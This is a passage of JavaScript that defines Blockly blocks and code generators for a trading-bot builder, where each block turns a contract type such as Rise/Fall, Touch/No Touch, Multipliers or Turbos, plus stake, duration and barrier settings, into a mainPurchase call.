  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: Ad
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: zd
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: Bd
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }, {
    type: "input_value",
    name: "ldp_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_over_under = function (l, a) {
  var b = l.getFieldValue("selcontract_nya");
  var c = l.getFieldValue("market_nya");
  var d = c == "activemarket" ? "mainSymbol" : c == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + c.split("|")[0] + "\"";
  var e = l.getFieldValue("account_nya");
  var f = l.getFieldValue("stakeAM_nya");
  var g = a.valueToCode(l, "stake_nya", javascript.Order.ATOMIC);
  if (g.toString().length == 0) {
    g = 1;
  }
  ;
  var m = a.valueToCode(l, "inpduration_nya", javascript.Order.ATOMIC);
  var i = a.valueToCode(l, "ldp_nya", javascript.Order.ATOMIC);
  var j = "mainPurchase(\"" + e + "\",\"" + f + "\"," + g + ",\"" + b + "\"," + d + "," + m + ",\"t\",0,0,0,0," + i + "," + i + ",0,0,0,0,0,0);";
  return j;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_even_odd",
  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Duration: ticks [1-10] %9",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Digit Even", "DIGITEVEN"], ["Digit Odd", "DIGITODD"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: Ad
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: zd
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: Bd
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_even_odd = function (k, a) {
  var b = k.getFieldValue("selcontract_nya");
  var c = k.getFieldValue("market_nya");
  var d = c == "activemarket" ? "mainSymbol" : c == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + c.split("|")[0] + "\"";
  var e = k.getFieldValue("account_nya");
  var f = k.getFieldValue("stakeAM_nya");
  var g = a.valueToCode(k, "stake_nya", javascript.Order.ATOMIC);
  if (g.toString().length == 0) {
    g = 1;
  }
  ;
  var l = a.valueToCode(k, "inpduration_nya", javascript.Order.ATOMIC);
  var i = "mainPurchase(\"" + e + "\",\"" + f + "\"," + g + ",\"" + b + "\"," + d + "," + l + ",\"t\",0,0,0,0,0,0,0,0,0,0,0,0);";
  return i;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_rise_fall",
  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Duration: %9 %10",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Rise", "CALL"], ["Fall", "PUT"], ["Rise (or Equals)", "CALLE"], ["Fall (or Equals)", "PUTE"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: Ad
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: zd
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: Bd
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "field_dropdown",
    name: "seldurationunit_nya",
    options: [["tick(s)", "t"], ["second(s)", "s"], ["minute(s)", "m"], ["hour(s)", "h"], ["day(s)", "d"]]
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_rise_fall = function (l, a) {
  var b = l.getFieldValue("selcontract_nya");
  var c = l.getFieldValue("market_nya");
  var d = c == "activemarket" ? "mainSymbol" : c == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + c.split("|")[0] + "\"";
  var e = l.getFieldValue("account_nya");
  var f = l.getFieldValue("stakeAM_nya");
  var g = a.valueToCode(l, "stake_nya", javascript.Order.ATOMIC);
  if (g.toString().length == 0) {
    g = 1;
  }
  ;
  var m = l.getFieldValue("seldurationunit_nya");
  var i = a.valueToCode(l, "inpduration_nya", javascript.Order.ATOMIC);
  var j = "mainPurchase(\"" + e + "\",\"" + f + "\"," + g + ",\"" + b + "\"," + d + "," + i + ",\"" + m + "\",\"+0\",0,0,0,0,0,0,0,0,0,0,0);";
  return j;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_higher_lower",
  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Duration: %9 %10 Barrier Offset: %11",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Higher", "CALL"], ["Lower", "PUT"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: Ad
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: zd
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: Bd
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "field_dropdown",
    name: "seldurationunit_nya",
    options: [["tick(s)", "t"], ["second(s)", "s"], ["minute(s)", "m"], ["hour(s)", "h"], ["day(s)", "d"]]
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }, {
    type: "input_value",
    name: "barrier_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_higher_lower = function (m, a) {
  var b = m.getFieldValue("selcontract_nya");
  var c = m.getFieldValue("market_nya");
  var d = c == "activemarket" ? "mainSymbol" : c == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + c.split("|")[0] + "\"";
  var e = m.getFieldValue("account_nya");
  var f = m.getFieldValue("stakeAM_nya");
  var g = a.valueToCode(m, "stake_nya", javascript.Order.ATOMIC);
  if (g.toString().length == 0) {
    g = 1;
  }
  ;
  var n = m.getFieldValue("seldurationunit_nya");
  var i = a.valueToCode(m, "inpduration_nya", javascript.Order.ATOMIC);
  var j = a.valueToCode(m, "barrier_nya", javascript.Order.ATOMIC);
  var k = "mainPurchase(\"" + e + "\",\"" + f + "\"," + g + ",\"" + b + "\"," + d + "," + i + ",\"" + n + "\"," + j + ",0,0,0,0,0,0,0,0,0,0,0);";
  return k;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_touch_notouch",
  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Duration: %9 %10 Barrier Offset: %11",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Touches", "ONETOUCH"], ["Does Not Touch", "NOTOUCH"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: Ad
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: zd
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: Bd
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "field_dropdown",
    name: "seldurationunit_nya",
    options: [["tick(s)", "t"], ["second(s)", "s"], ["minute(s)", "m"], ["hour(s)", "h"], ["day(s)", "d"]]
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }, {
    type: "input_value",
    name: "barrier_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_touch_notouch = function (m, a) {
  var b = m.getFieldValue("selcontract_nya");
  var c = m.getFieldValue("market_nya");
  var d = c == "activemarket" ? "mainSymbol" : c == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + c.split("|")[0] + "\"";
  var e = m.getFieldValue("account_nya");
  var f = m.getFieldValue("stakeAM_nya");
  var g = a.valueToCode(m, "stake_nya", javascript.Order.ATOMIC);
  if (g.toString().length == 0) {
    g = 1;
  }
  ;
  var n = m.getFieldValue("seldurationunit_nya");
  var i = a.valueToCode(m, "inpduration_nya", javascript.Order.ATOMIC);
  var j = a.valueToCode(m, "barrier_nya", javascript.Order.ATOMIC);
  var k = "mainPurchase(\"" + e + "\",\"" + f + "\"," + g + ",\"" + b + "\"," + d + "," + i + ",\"" + n + "\"," + j + ",0,0,0,0,0,0,0,0,0,0,0);";
  return k;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_endsbetween_endsoutside",
  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Duration: %9 %10 High Barrier Offset: %11 Low Barrier Offset: %12",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Ends Between", "EXPIRYRANGE"], ["Ends Outside", "EXPIRYMISS"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: Ad
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: zd
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: Bd
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "field_dropdown",
    name: "seldurationunit_nya",
    options: [["minute(s)", "m"], ["hour(s)", "h"], ["day(s)", "d"]]
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }, {
    type: "input_value",
    name: "highbarrier_nya"
  }, {
    type: "input_value",
    name: "lowbarrier_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_endsbetween_endsoutside = function (n, a) {
  var b = n.getFieldValue("selcontract_nya");
  var c = n.getFieldValue("market_nya");
  var d = c == "activemarket" ? "mainSymbol" : c == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + c.split("|")[0] + "\"";
  var e = n.getFieldValue("account_nya");
  var f = n.getFieldValue("stakeAM_nya");
  var g = a.valueToCode(n, "stake_nya", javascript.Order.ATOMIC);
  if (g.toString().length == 0) {
    g = 1;
  }
  ;
  var o = n.getFieldValue("seldurationunit_nya");
  var i = a.valueToCode(n, "inpduration_nya", javascript.Order.ATOMIC);
  var j = a.valueToCode(n, "highbarrier_nya", javascript.Order.ATOMIC);
  var k = a.valueToCode(n, "lowbarrier_nya", javascript.Order.ATOMIC);
  var l = "mainPurchase(\"" + e + "\",\"" + f + "\"," + g + ",\"" + b + "\"," + d + "," + i + ",\"" + o + "\",0," + j + "," + k + ",0,0,0,0,0,0,0,0,0);";
  return l;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_staysbetween_goesoutside",
  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Duration: %9 %10 High Barrier Offset: %11 Low Barrier Offset: %12",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Stays Between", "RANGE"], ["Goes Outside", "UPORDOWN"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: Ad
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: zd
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: Bd
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "field_dropdown",
    name: "seldurationunit_nya",
    options: [["minute(s)", "m"], ["hour(s)", "h"], ["day(s)", "d"]]
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }, {
    type: "input_value",
    name: "highbarrier_nya"
  }, {
    type: "input_value",
    name: "lowbarrier_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_staysbetween_goesoutside = function (n, a) {
  var b = n.getFieldValue("selcontract_nya");
  var c = n.getFieldValue("market_nya");
  var d = c == "activemarket" ? "mainSymbol" : c == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + c.split("|")[0] + "\"";
  var e = n.getFieldValue("account_nya");
  var f = n.getFieldValue("stakeAM_nya");
  var g = a.valueToCode(n, "stake_nya", javascript.Order.ATOMIC);
  if (g.toString().length == 0) {
    g = 1;
  }
  ;
  var o = n.getFieldValue("seldurationunit_nya");
  var i = a.valueToCode(n, "inpduration_nya", javascript.Order.ATOMIC);
  var j = a.valueToCode(n, "highbarrier_nya", javascript.Order.ATOMIC);
  var k = a.valueToCode(n, "lowbarrier_nya", javascript.Order.ATOMIC);
  var l = "mainPurchase(\"" + e + "\",\"" + f + "\"," + g + ",\"" + b + "\"," + d + "," + i + ",\"" + o + "\",0," + j + "," + k + ",0,0,0,0,0,0,0,0,0);";
  return l;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_asianup_asiandown",
  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Duration: ticks [5-10] %9",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Asian Up", "ASIANU"], ["Asian Down", "ASIAND"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: Ad
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: zd
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: Bd
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_asianup_asiandown = function (k, a) {
  var b = k.getFieldValue("selcontract_nya");
  var c = k.getFieldValue("market_nya");
  var d = c == "activemarket" ? "mainSymbol" : c == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + c.split("|")[0] + "\"";
  var e = k.getFieldValue("account_nya");
  var f = k.getFieldValue("stakeAM_nya");
  var g = a.valueToCode(k, "stake_nya", javascript.Order.ATOMIC);
  if (g.toString().length == 0) {
    g = 1;
  }
  ;
  var l = a.valueToCode(k, "inpduration_nya", javascript.Order.ATOMIC);
  var i = "mainPurchase(\"" + e + "\",\"" + f + "\"," + g + ",\"" + b + "\"," + d + "," + l + ",\"t\",0,0,0,0,0,0,0,0,0,0,0,0);";
  return i;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_highclose_closelow_highlow",
  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Duration: minutes [1-30] %9 Multiplier: %10",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["High-Close", "LBFLOATPUT"], ["Close-Low", "LBFLOATCALL"], ["High-Low", "LBHIGHLOW"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: Ad
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: zd
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: Bd
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }, {
    type: "input_value",
    name: "multiplier_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_highclose_closelow_highlow = function (l, a) {
  var b = l.getFieldValue("selcontract_nya");
  var c = l.getFieldValue("market_nya");
  var d = c == "activemarket" ? "mainSymbol" : c == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + c.split("|")[0] + "\"";
  var e = l.getFieldValue("account_nya");
  var f = l.getFieldValue("stakeAM_nya");
  var g = a.valueToCode(l, "stake_nya", javascript.Order.ATOMIC);
  if (g.toString().length == 0) {
    g = 1;
  }
  ;
  var m = a.valueToCode(l, "inpduration_nya", javascript.Order.ATOMIC);
  var i = a.valueToCode(l, "multiplier_nya", javascript.Order.ATOMIC);
  var j = "mainPurchase(\"" + e + "\",\"" + f + "\"," + g + ",\"" + b + "\"," + d + "," + m + ",\"m\",0,0,0,0,0,0," + i + ",0,0,0,0,0);";
  return j;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_resetcall_resetput",
  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Duration: %9 %10",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Reset Call", "RESETCALL"], ["Reset Put", "RESETPUT"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: Ad
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: zd
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: Bd
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "field_dropdown",
    name: "seldurationunit_nya",
    options: [["tick(s)", "t"], ["second(s)", "s"], ["minute(s)", "m"], ["hour(s)", "h"]]
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_resetcall_resetput = function (l, a) {
  var b = l.getFieldValue("selcontract_nya");
  var c = l.getFieldValue("market_nya");
  var d = c == "activemarket" ? "mainSymbol" : c == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + c.split("|")[0] + "\"";
  var e = l.getFieldValue("account_nya");
  var f = l.getFieldValue("stakeAM_nya");
  var g = a.valueToCode(l, "stake_nya", javascript.Order.ATOMIC);
  if (g.toString().length == 0) {
    g = 1;
  }
  ;
  var m = l.getFieldValue("seldurationunit_nya");
  var i = a.valueToCode(l, "inpduration_nya", javascript.Order.ATOMIC);
  var j = "mainPurchase(\"" + e + "\",\"" + f + "\"," + g + ",\"" + b + "\"," + d + "," + i + ",\"" + m + "\",0,0,0,0,0,0,0,0,0,0,0,0);";
  return j;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_hightick_lowtick",
  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Duration: 5 Ticks %9 Tick Prediction: [1-5] %10",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["High Tick", "TICKHIGH"], ["Low Tick", "TICKLOW"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: Ad
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: zd
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: Bd
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "input_end_row"
  }, {
    type: "input_value",
    name: "tickprediction_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_hightick_lowtick = function (k, a) {
  var b = k.getFieldValue("selcontract_nya");
  var c = k.getFieldValue("market_nya");
  var d = c == "activemarket" ? "mainSymbol" : c == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + c.split("|")[0] + "\"";
  var e = k.getFieldValue("account_nya");
  var f = k.getFieldValue("stakeAM_nya");
  var g = a.valueToCode(k, "stake_nya", javascript.Order.ATOMIC);
  if (g.toString().length == 0) {
    g = 1;
  }
  ;
  var l = a.valueToCode(k, "tickprediction_nya", javascript.Order.ATOMIC);
  var i = "mainPurchase(\"" + e + "\",\"" + f + "\"," + g + ",\"" + b + "\"," + d + ",5,\"t\",0,0,0,0,0,0,0," + l + ",0,0,0,0);";
  return i;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_onlyups_onlydowns",
  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Duration: ticks [2-5] %9",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Only Ups", "RUNHIGH"], ["Only Downs", "RUNLOW"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: Ad
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: zd
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: Bd
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_onlyups_onlydowns = function (k, a) {
  var b = k.getFieldValue("selcontract_nya");
  var c = k.getFieldValue("market_nya");
  var d = c == "activemarket" ? "mainSymbol" : c == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + c.split("|")[0] + "\"";
  var e = k.getFieldValue("account_nya");
  var f = k.getFieldValue("stakeAM_nya");
  var g = a.valueToCode(k, "stake_nya", javascript.Order.ATOMIC);
  if (g.toString().length == 0) {
    g = 1;
  }
  ;
  var l = a.valueToCode(k, "inpduration_nya", javascript.Order.ATOMIC);
  var i = "mainPurchase(\"" + e + "\",\"" + f + "\"," + g + ",\"" + b + "\"," + d + "," + l + ",\"t\",0,0,0,0,0,0,0,0,0,0,0,0);";
  return i;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_accumulatorup",
  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Growth Rate % [1-5]: %9 Take Profit: %10",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Accumulator Up", "ACCU"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: Ad
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: zd
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: Bd
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "input_value",
    name: "selaccumulate_nya"
  }, {
    type: "input_value",
    name: "limittp_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_accumulatorup = function (l, a) {
  var b = l.getFieldValue("selcontract_nya");
  var c = l.getFieldValue("market_nya");
  var d = c == "activemarket" ? "mainSymbol" : c == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + c.split("|")[0] + "\"";
  var e = l.getFieldValue("account_nya");
  var f = l.getFieldValue("stakeAM_nya");
  var g = a.valueToCode(l, "stake_nya", javascript.Order.ATOMIC);
  if (g.toString().length == 0) {
    g = 1;
  }
  ;
  var m = a.valueToCode(l, "selaccumulate_nya", javascript.Order.ATOMIC);
  var i = a.valueToCode(l, "limittp_nya", javascript.Order.ATOMIC);
  var j = "mainPurchase(\"" + e + "\",\"" + f + "\"," + g + ",\"" + b + "\"," + d + ",100,\"t\",0,0,0,0,0,0,0,0," + m + ",0," + i + ",0);";
  return j;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_multiplyup_multiplydown",
  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Multiplier: %9 %10 Take Profit: %11 Stop Loss: %12",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Multiply Up", "MULTUP"], ["Multiply Down", "MULTDOWN"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: Ad
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: zd
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: Bd
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "field_dropdown",
    name: "selmultipliermultiply_nya",
    options: [["x100", "100"], ["x200", "200"], ["x300", "300"], ["x500", "500"], ["x1000", "1000"]]
  }, {
    type: "input_end_row"
  }, {
    type: "input_value",
    name: "limittp_nya"
  }, {
    type: "input_value",
    name: "limitsl_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_multiplyup_multiplydown = function (m, a) {
  var b = m.getFieldValue("selcontract_nya");
  var c = m.getFieldValue("market_nya");
  var d = c == "activemarket" ? "mainSymbol" : c == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + c.split("|")[0] + "\"";
  var e = m.getFieldValue("account_nya");
  var f = m.getFieldValue("stakeAM_nya");
  var g = a.valueToCode(m, "stake_nya", javascript.Order.ATOMIC);
  if (g.toString().length == 0) {
    g = 1;
  }
  ;
  var n = m.getFieldValue("selmultipliermultiply_nya");
  var i = a.valueToCode(m, "limittp_nya", javascript.Order.ATOMIC);
  var j = a.valueToCode(m, "limitsl_nya", javascript.Order.ATOMIC);
  var k = "mainPurchase(\"" + e + "\",\"" + f + "\"," + g + ",\"" + b + "\"," + d + ",0,\"t\",0,0,0,0,0,0,0,0,0,\"" + n + "\"," + i + "," + j + ");";
  return k;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_vanillalongcall_vanillalongput",
  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Duration: %9 %10 Barrier Offset: %11",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Vanilla Long Call", "VANILLALONGCALL"], ["Vanilla Long Put", "VANILLALONGPUT"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: Ad
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: zd
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: Bd
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "field_dropdown",
    name: "seldurationunit_nya",
    options: [["minute(s)", "m"], ["hour(s)", "h"], ["day(s)", "d"]]
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }, {
    type: "input_value",
    name: "barrier_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_vanillalongcall_vanillalongput = function (m, a) {
  var b = m.getFieldValue("selcontract_nya");
  var c = m.getFieldValue("market_nya");
  var d = c == "activemarket" ? "mainSymbol" : c == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + c.split("|")[0] + "\"";
  var e = m.getFieldValue("account_nya");
  var f = m.getFieldValue("stakeAM_nya");
  var g = a.valueToCode(m, "stake_nya", javascript.Order.ATOMIC);
  if (g.toString().length == 0) {
    g = 1;
  }
  ;
  var n = m.getFieldValue("seldurationunit_nya");
  var i = a.valueToCode(m, "inpduration_nya", javascript.Order.ATOMIC);
  var j = a.valueToCode(m, "barrier_nya", javascript.Order.ATOMIC);
  var k = "mainPurchase(\"" + e + "\",\"" + f + "\"," + g + ",\"" + b + "\"," + d + "," + i + ",\"" + n + "\"," + j + ",0,0,0,0,0,0,0,0,0,0,0);";
  return k;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_turboslong_turbosshort",
  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Duration: %9 %10 Barrier Offset: %11",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Turbos Long", "TURBOSLONG"], ["Turbos Short", "TURBOSSHORT"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: Ad
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: zd
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: Bd
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "field_dropdown",
    name: "seldurationunit_nya",
    options: [["tick(s)", "t"], ["second(s)", "s"], ["minute(s)", "m"], ["hour(s)", "h"], ["day(s)", "d"]]
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }, {
    type: "input_value",
    name: "barrier_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_turboslong_turbosshort = function (m, a) {
  var b = m.getFieldValue("selcontract_nya");
  var c = m.getFieldValue("market_nya");
  var d = c == "activemarket" ? "mainSymbol" : c == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + c.split("|")[0] + "\"";
